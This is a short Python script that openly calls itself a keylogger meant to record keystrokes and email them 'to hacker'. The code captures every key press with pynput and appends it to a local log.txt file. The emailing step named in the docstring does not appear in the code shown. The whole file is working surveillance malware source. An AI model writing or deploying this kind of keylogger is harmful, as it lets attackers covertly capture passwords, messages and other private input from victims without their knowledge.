'''
This is an advanced keylogger programmed written in Python3 designed to record keystrokes
and e-mail txt files to hacker.
'''

from pynput.keyboard import Listener


# Record keystrokes and place in txt file
# Listener - records keystrokes

# "with" keyword - releases memory/resources automatically

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    with open("log.txt", "a") as txt_file:
        txt_file.write(letter)

with Listener(on_press=write_to_file) as L:
    L.join()
